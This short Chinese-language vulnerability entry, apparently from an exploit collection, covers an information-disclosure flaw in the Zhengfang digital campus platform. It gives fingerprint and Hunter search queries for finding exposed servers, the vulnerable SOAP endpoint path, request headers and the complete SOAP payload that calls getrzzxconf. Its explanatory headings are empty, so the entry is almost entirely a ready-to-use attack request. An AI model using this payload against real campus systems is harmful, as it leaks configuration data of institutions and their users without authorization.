# 正方数字化校园平台getrzzxconf存在信息泄漏漏洞

- **系统**：正方数字化校园平台　|　**类型**：信息泄露　|　**CVE**：—
- **指纹**：`title="正方数字化校园信息门户"`
- **请求**：`POST /zfca/axis/RzzxConfManage HTTP/1.1`
- **关键头**：`Cookie: JSESSIONID=C5BA8FCE6078136DED5E9ABFAFBD023D`　`Content-Type: text/xml;charset=UTF-8`　`Host: {hostname}`　`Content-Length: 402`

**请求体 / payload**
```
<soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:pub="http://pubService.webServices.zfca.zfsoft.com">
<soapenv:Header/>
<soapenv:Body>
<pub:getrzzxconf soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"/>
</soapenv:Body>
</soapenv:Envelope>
```

**其他**
- 正方数字化校园平台getrzzxconf存在信息泄漏漏洞: * 一、漏洞简介
* 二、影响版本
* 四、漏洞复现
***
- 版本: * hunter`(web.title="正方数字化校园信息门户" ｜ web.title="数字化校园信息门户" ｜ web.title="统一身份认证中心")&&web.body="正方"`、<code>web.body="zfca/login"&&web.body="login_bg"</code>
* 特征